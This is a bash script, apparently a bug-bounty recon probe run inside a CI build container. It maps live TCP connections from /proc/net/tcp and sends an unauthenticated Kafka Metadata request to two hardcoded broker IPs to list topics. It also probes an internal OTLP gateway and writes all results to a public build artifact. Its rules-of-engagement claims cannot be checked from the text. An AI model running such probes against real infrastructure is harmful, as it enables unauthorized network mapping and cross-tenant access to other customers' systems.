#!/usr/bin/env bash
# H1 build-container recon v6 — final build-container probe: control-plane reach (Kafka + OTLP).
# v5 mapped the active TCP connections (uid=0 build-agent -> Kafka brokers :9092 + OTLP gateway :4317).
# RoE explicitly INVITES reaching the orchestration control plane from the build. This probe tests
# whether the Kafka brokers accept an UNAUTHENTICATED Metadata request (=> cross-tenant build-event
# read possible) or require SASL (=> closed). METADATA-ONLY: we list brokers/topics to prove access;
# we do NOT consume message payloads (could contain other tenants' data — out of minimum-proof scope).
# Also re-captures /proc/net/tcp (decoder FIXED vs v5 double-reverse bug) for current control-plane IPs.
# Read-only, RoE-clean, low-and-slow. Researcher: abedalaziz123sayed. No secret values exfiled.
set +e
PUB="public/recon6.txt"; mkdir -p public; : > "$PUB"
p(){ echo "$*" >> "$PUB"; }
UA="abedalaziz123sayed-h1-research"
p "=====RECON6 START====="
p "id=$(id)  node=$HOST_NODE_IP  ip=$(hostname -I 2>/dev/null)"

# 1) re-capture active TCP connections (CORRECT decode) -> control-plane IPs (kafka 9092, otlp 4317, etc)
python3 - <<'PY' >> "$PUB"
import struct,socket
st={1:'EST',2:'SYN',6:'TWAIT',8:'CLOSEW',9:'LASTACK',10:'LISTEN'}
def dec(a):
    try:
        h,pt=a.split(':'); b=struct.pack('<I',int(h,16))
        return f'{b[0]}.{b[1]}.{b[2]}.{b[3]}:{int(pt,16)}'
    except: return '?:'+a
kafka=set(); otlp=set(); intern=set()
print("## /proc/net/tcp (correct decode):")
try:
    for ln in open('/proc/net/tcp').read().splitlines()[1:]:
        f=ln.split(); lip=dec(f[1]); rip=dec(f[2]); state=st.get(int(f[3],16),f[3]); uid=f[7]
        print(f"  {lip} -> {rip} state={state} uid={uid}")
        rhost,rport=rip.split(':')
        if rport=='9092' and state=='EST': kafka.add(rhost)
        if rport=='4317': otlp.add(rhost)
        if rhost.startswith('172.16.') or rhost.startswith('10.') or rhost.startswith('192.168.'): intern.add(rip)
except Exception as e: print("  tcp_err",e)
print("KAFKA_BROKERS_EST="+",".join(sorted(kafka)))
print("OTLP_ENDPOINTS="+",".join(sorted(otlp)))
print("INTERNAL_REMOTES="+",".join(sorted(intern)))
PY

# 2) Kafka unauth Metadata probe (api_key=3, v1, empty topic array = all topics). Metadata-only.
python3 - <<'PY' >> "$PUB"
import struct,socket,time
brokers=["104.198.169.196","104.154.167.74","104.198.169.196","104.154.167.74"]
# also try to read fresh brokers from our own /proc capture? they're in public/recon6.txt already;
# hardcode the two known + retry.
def meta_req():
    p=struct.pack('>hh',3,1)+struct.pack('>i',1)+struct.pack('>h',-1)+struct.pack('>i',0)
    return struct.pack('>i',len(p))+p
def parse_topics(resp):
    # resp = int32 len + payload. payload: int32 broker_count, [broker: nodeid(i32), host(str), port(i32)], int32 topic_count, [topic: err(i16), name(str), int32 part_count, [part: err(i16), leader(i32), replicas(i32 arr), isr(i32 arr)]]
    try:
        off=0; ln=struct.unpack('>i',resp[off:off+4])[0]; off+=4
        body=resp[off:off+ln]
        o=0
        bc=struct.unpack('>i',body[o:o+4])[0]; o+=4
        for _ in range(bc):
            o+=4  # nodeid
            sl=struct.unpack('>h',body[o:o+2])[0]; o+=2; o+=sl+4  # host str + port
        tc=struct.unpack('>i',body[o:o+4])[0]; o+=4
        topics=[]
        for _ in range(tc):
            err=struct.unpack('>h',body[o:o+2])[0]; o+=2
            sl=struct.unpack('>h',body[o:o+2])[0]; o+=2
            nm=body[o:o+sl].decode('utf-8','replace'); o+=sl
            topics.append((err,nm))
            pc=struct.unpack('>i',body[o:o+4])[0]; o+=4
            for _ in range(pc):
                o+=2  # part err
                o+=4  # leader
                rc=struct.unpack('>i',body[o:o+4])[0]; o+=4; o+=rc*4
                ic=struct.unpack('>i',body[o:o+4])[0]; o+=4; o+=ic*4
        return topics
    except Exception as e: return f"PARSE_ERR:{e}"
print("## kafka unauth metadata probe (metadata-only, no message consume):")
for bk in ["104.198.169.196","104.154.167.74"]:
    try:
        s=socket.socket(); s.settimeout(5); s.connect((bk,9092))
        s.sendall(meta_req())
        data=s.recv(65536); s.close()
        if len(data)<8:
            print(f"  {bk}:9092 -> recv {len(data)}b (likely SASL-required or closed)")
        else:
            t=parse_topics(data)
            if isinstance(t,str): print(f"  {bk}:9092 -> resp {len(data)}b {t}")
            else:
                print(f"  {bk}:9092 -> UNAUTH METADATA OK, {len(t)} topics (showing first 15):")
                for err,nm in t[:15]:
                    print(f"     err={err} topic={nm}")
                if len(t)>15: print(f"     ... +{len(t)-15} more")
    except Exception as e:
        print(f"  {bk}:9092 -> CONNECT_FAIL: {e}")
PY

# 3) OTLP gateway inbound probe (172.16.7.1:4317) — is it reachable/responds from buildbot?
p "## otlp gateway 172.16.7.1:4317 inbound:"
p "  http_get=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://172.16.7.1:4317/ 2>/dev/null)"
p "  tcp_connect=$(python3 -c "import socket;s=socket.socket();s.settimeout(3);
try:
 s.connect(('172.16.7.1',4317));print('open')
except Exception as e:print('fail:'+str(e)[:60])" 2>&1)"

p "=====RECON6 END====="
cat "$PUB"
